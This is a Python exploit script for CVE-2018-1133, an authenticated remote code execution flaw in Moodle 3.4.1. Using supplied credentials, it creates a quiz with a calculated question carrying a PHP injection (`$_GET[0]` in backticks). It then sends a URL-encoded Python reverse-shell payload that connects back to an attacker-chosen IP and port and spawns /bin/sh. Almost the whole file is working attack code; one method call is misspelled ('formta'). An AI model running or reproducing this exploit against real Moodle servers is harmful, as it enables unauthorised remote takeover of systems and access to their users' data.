import argparse
import random
import requests
import lxml.html
import sys
import json
import urllib.parse
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2018-1133
# Moodle v3.4.1 authenticated RCE.
class CVE2018_1133:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, user, passwd, host, port, cid):
        print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.user, self.passwd = user, passwd
        self.host, self.port = host, port
        self.cid = cid
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.payload = "(python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((\"" + self.host + "\"," + self.port + "))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call([\"/bin/sh\",\"-i\"])%3b')"

    # login with creds
    def login(self):
        print (LogColors.BLUE + "login with credentials..." + LogColors.ENDC)
        data = {"anchor" : "", "username" : self.user, "password" : self.passwd}
        self.session.get(self.url, verify = False)
        r = self.session.post(self.url + "/login/index.php", data = data)
        if r.ok:
            print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to login with credentials. exit" + LogColors.ENDC)
            sys.exit()

    # parse session key
    def get_session_key(self):
        print (LogColors.BLUE + "parse session key..." + LogColors.ENDC)
        r = self.session.get(self.url + "/my", verify = False)
        tree = lxml.html.fromstring(r.text)
        sesskey = tree.xpath('.//form[@method="post"]//input[@name="sesskey"]/@value')
        if sesskey[0]:
            self.session_key = sesskey[0]
            print (LogColors.GREEN + "successfully parse session key..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed parse session key. you are idiot :(" + LogColors.ENDC)
            sys.exit()

    # load course by course id (cid)
    def load_course(self):
        print (LogColors.BLUE + "load course by id..." + LogColors.ENDC)
        r = self.session.get(self.url + "/course/view.php?id={}".format(self.cid),
                allow_redirects = False, verify = False)
        if r.ok:
            print (LogColors.YELLOW + "course page successfully loaded..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "fail to load course page. you are idiot :(" + LogColors.ENDC)
            sys.exit()
    
    # turn on editing
    def turn_on_editing(self):
        print (LogColors.BLUE + "turn on editing course..." + LogColors.ENDC)
        r = self.session.get(self.url + "/course/view.php?id={}&sesskey={}&edit=on"
                .format(self.cid, self.session_key), allow_redirects = False)
        if r.ok:
            print (LogColors.YELLOW + "course editing successfully on..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to load course edit. you are idiot :(" + LogColors.ENDC)
            sys.exit()

    # add topic
    def add_topic(self):
        print (LogColors.BLUE + "add topic..." + LogColors.ENDC)
        params = (
            ("sesskey", self.session_key),
            ("info", "core_update_inplace_editable")
        )
        data = [{
            "index" : 0,
            "methodname" : "core_update_inplace_editable",
            "args" : {
                "itemid" : "2", 
                "component" : "format_topics",
                "itemtype" : "sectionname",
                "value" : "hacked {} :)".format(random.randint(0, 10))
            }
        }]
        data =  json.dumps(data)
        r = self.session.post(
        self.url + '/lib/ajax/service.php?sesskey={}&info=core_update_inplace_editable'.format(
        self.session_key), data = data)
        if r.ok and '"error":false' in r.text:
            print (LogColors.YELLOW + "successfully create topic..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to create topic :(" + LogColors.ENDC)
            sys.exit()

    # adding new quiz
    def add_quiz(self):
        print (LogColors.BLUE + "adding quiz..." + LogColors.ENDC)
        jump = self.url + "/course/mod.php?id={}&sesskey={}&str=0&add=quiz&section=0".format(self.cid, self.session_key)
        data = {
            'course' : self.cid,
            'sesskey' : self.session_key,
            'jump' : jump
        }
        r = self.session.post(self.url + "/course/jumpto.php", data = data, allow_redirects = False)
        if r.ok:
            print (LogColors.YELLOW + "successfully add quiz..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "add quiz failed :(" + LogColors.ENDC)
            sys.exit()

    # configure new quiz
    def configure_quiz(self):
        print (LogColors.BLUE + "configure quiz..." + LogColors.ENDC)
        data = {
            "grade" : 10,
            "boundary_repeats" : 1,
            "completionunlocked" : 1,
            "course" : self.cid,
            "coursemodule" : "",
            "section" : 0,
            "module" : 16,
            "modulename" : "quiz",
            "instance" : "",
            "add" : "quiz",
            "update" : 0,
            "return" : 0,
            "sr" : 0,
            "sesskey" : self.session_key,
            "_qf__mod_quiz_mod_form" : 1,
            "mform_showmore_id_layouthdr" : 0,
            "mform_showmore_id_interactionhdr" : 0,
            "mform_showmore_id_display" : 0,
            "mform_showmore_id_security" : 0,
            "mform_isexpanded_id_general" : 1,
            "mform_isexpanded_id_timing" : 0,
            "mform_isexpanded_id_modstandardgrade" : 0,
            "mform_isexpanded_id_layouthdr" : 0,
            "mform_isexpanded_id_interactionhdr" : 0,
            "mform_isexpanded_id_reviewoptionshdr" : 0,
            "mform_isexpanded_id_display" : 0,
            "mform_isexpanded_id_security" : 0,
            "mform_isexpanded_id_overallfeedbackhdr" : 0,
            "mform_isexpanded_id_modstandardelshdr" : 0,
            "mform_isexpanded_id_availabilityconditionsheader" : 0,
            "mform_isexpanded_id_activitycompletionheader" : 0,
            "mform_isexpanded_id_tagshdr" : 0,
            "mform_isexpanded_id_competenciessection" : 0,
            "name" : "hack {}".format(random.randint(0, 10000)),
            #"introeditor[text]" : urllib.parse.quote_plus("<p>=^..^=<br></p>"),
            "introeditor[text]" : "<p>=^..^=<br>=^..^=</p>",
            "introeditor[format]" : 1,
            "introeditor[itemid]" : 974969799,
            "showdescription" : 0,
            "overduehandling" : "autosubmit",
            "gradecat" : 1,
            "gradepass" : "",
            "attempts" : 0,
            "grademethod" : 1,
            "questionsperpage" : 1,
            "navmethod" : "free",
            "shuffleanswers" : 1,
            "preferredbehaviour" : "deferredfeedback",
            "attemptonlast" : 0,
            "attemptimmediately" : 1,
            "correctnessimmediately" : 1,
            "marksimmediately" : 1,
            "specificfeedbackimmediately" : 1,
            "generalfeedbackimmediately" : 1,
            "rightanswerimmediately" : 1,
            "overallfeedbackimmediately" : 1,
            "attemptopen" : 1,
            "correctnessopen" : 1,
            "marksopen" : 1,
            "specificfeedbackopen" : 1,
            "generalfeedbackopen" : 1,
            "rightansweropen" : 1,
            "overallfeedbackopen" : 1,
            "showuserpicture" : 0,
            "decimalpoints" : 2,
            "questiondecimalpoints" : -1,
            "showblocks" : 0,
            "quizpassword" : "",
            "subnet" : "",
            "browsersecurity" : "-",
            "feedbacktext[0][text]" : "",
            "feedbacktext[0][format]" : 1,
            "feedbacktext[0][itemid]" : 520214079,
            "feedbackboundaries[0]" : "",
            "feedbacktext[1][text]" : "",
            "feedbacktext[1][format]" : 1,
            "feedbacktext[1][itemid]" : 540403739,
            "visible" : 1,
            "cmidnumber" : "",
            "groupmode" : 0,
            #"availabilityconditionsjson" : urllib.parse.quote_plus('{\"op\":\"&\",\"c\":[],\"showc\":[]}'),
            "availabilityconditionsjson" : '{\"op\":\"&\",\"c\":[],\"showc\":[]}',
            "completion" : 1,
            "tags" : "_qf__force_multiselect_submission",
            "competency_rule" : 0,
            "submitbutton" : "Save and display"
        }
        r = self.session.post(self.url + "/course/modedit.php", data = data, allow_redirects = False)
        if r.ok:
            tree = lxml.html.fromstring(r.text)
            link = tree.xpath(".//div//a/@href")
            if link[0]:
                link = link[0]
                self.cmid = link[link.find("?id=")+4:link.find("&amp")]
                print (LogColors.YELLOW + "Quiz ID: " + self.cmid + LogColors.ENDC)
                print (LogColors.YELLOW + "successfully configure quiz..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to configure quiz. you are idiot..." + LogColors.ENDC)
            sys.exit()

    # edit quiz
    def edit_quiz(self):
        print (LogColors.BLUE + "edit quiz page..." + LogColors.ENDC)
        r = self.session.get(self.url + "/mod/quiz/edit.php?cmid={}".formta(self.cmid))
        if r.ok:
            print (LogColors.YELLOW + "successfully load edit quiz..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to load edit quiz :(" + LogColors.ENDC)
            sys.exit()

    # calc question
    def calc_question(self):
        print (LogColors.BLUE + "add calc question..." + LogColors.ENDC)
        url = self.url + "/question/question.php?courseid=" + self.cid + "&sesskey=" + self.session_key + "&qtype=calculated&returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D" + self.cmid + "%26addonpage%3D0&cmid=" + self.cmid  + "&category=2&addonpage=0&appendqnumstring=addquestion'"
        r = self.session.get(url, allow_redirects = False, verify = False)
        if r.ok:
            print (LogColors.YELLOW + "successfully add calc question..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to add calc question :(" + LogColors.ENDC)
            sys.exit()

    # add evil
    def add_evil(self):
        print (LogColors.BLUE + "add evil..." + LogColors.ENDC)
        data = {
            "initialcategory" : 1,
            "reload" : 1,
            "shuffleanswers" : 1,
            "answernumbering" : "abc",
            "mform_isexpanded_id_answerhdr" : 1,
            "noanswers" : 1,
            "nounits" : 1,
            "numhints" : 2,
            "synchronize" : "",
            "wizard" : "datasetdefinitions",
            "id" : "",
            "inpopup" : 0,
            "cmid" : self.cmid,
            "courseid" : 2,
            "returnurl" : "/mod/quiz/edit.php?cmid={}&addonpage=0".format(self.cmid),
            "scrollpos" : 0,
            "appendqnumstring" : "addquestion",
            "qtype" : "calculated",
            "makecopy" : 0,
            "sesskey" : self.session_key,
            "_qf__qtype_calculated_edit_form" : 1,
            "mform_isexpanded_id_generalheader" : 1,
            "mform_isexpanded_id_unithandling" : 0,
            "mform_isexpanded_id_unithdr" : 0,
            "mform_isexpanded_id_multitriesheader" : 0,
            "mform_isexpanded_id_tagsheader" : 0,
            "category" : "2,23",
            "name" : "kukukuku",
            "questiontext[text]" : "<p>kukukuku<br></p>",
            "questiontext[format]" : 1,
            "questiontext[itemid]" : 999787569,
            "defaultmark" : 1,
            "generalfeedback[text]" : "",
            "generalfeedback[format]" : 1,
            "generalfeedback[itemid]" : 729029157,
            "answer[0]" : ' /*{a*/`$_GET[0]`;//{x}}',
            "fraction[0]" : "1.0",
            "tolerance[0]" : "0.01",
            "tolerancetype[0]" : 1,
            "correctanswerlength[0]" : 2,
            "correctanswerformat[0]" : 1,
            "feedback[0][text]" : "",
            "feedback[0][format]" : 1,
            "feedback[0][itemid]" : 928615051,
            "unitrole" : 3,
            "penalty" : "0.3333333",
            "hint[0]text]" : "",
            "hint[0]format]" : 1,
            "hint[0]itemid]" : 236679070,
            "hint[1]text]" : "",
            "hint[1]format]" : 1,
            "hint[1]itemid]" : 272691514,
            "tags" : "_qf__force_multiselect_submission",
            "submitbutton" : "Save change"
        }

        r = self.session.post(self.url + "/question/question.php", data = data)
        if r.ok:
            print (LogColors.YELLOW + "evil question successfully created :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to create evil question :(" + LogColors.ENDC)
            sys.exit()

    # send evil payload
    def send_payload(self):
        print (LogColors.BLUE + "send evil payload with reverse shell..." + LogColors.ENDC)
        print (LogColors.YELLOW + self.payload + LogColors.ENDC)
        return_url = "/mod/quiz/edit.php?cmid={}".format(self.cmid)
        evil_url = self.url + "/question/question.php?returnurl={}".format(return_url)
        evil_url += "&addonpage=0&appendqnumstring=addquestion&scrollpos=0&id=8&wizardnow=datasetitems"
        evil_url += "&cmid={}&0=({})".format(self.cmid, self.payload)

        r = self.session.get(evil_url, verify = False)
        if r.ok:
            print (LogColors.GREEN + "=^..^= good job. successssssssfully send payload. hacked. =^..^=" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed exploit. you are idiot :(" + LogColors.ENDC)
            sys.exit()

    # exploitation logic
    def exploit(self):
        self.login()
        self.get_session_key()
        self.load_course()
        self.turn_on_editing()
        self.add_topic()
        self.add_quiz()
        self.configure_quiz()
        self.edit_quiz()
        self.add_evil()
        self.send_payload()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-U','--username', required = True, help = "auth username")
    parser.add_argument('-P','--password', required = True, help = "auth password")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    parser.add_argument('-c', '--cid', required = True, help = "course id")
    args = vars(parser.parse_args())
    url = args['url']
    user, pwd = args['username'], args['password']
    ip, port = args['ip'], args['port']
    cid = args['cid']
    cve = CVE2018_1133(url, user, pwd, ip, port, cid)
    cve.exploit()

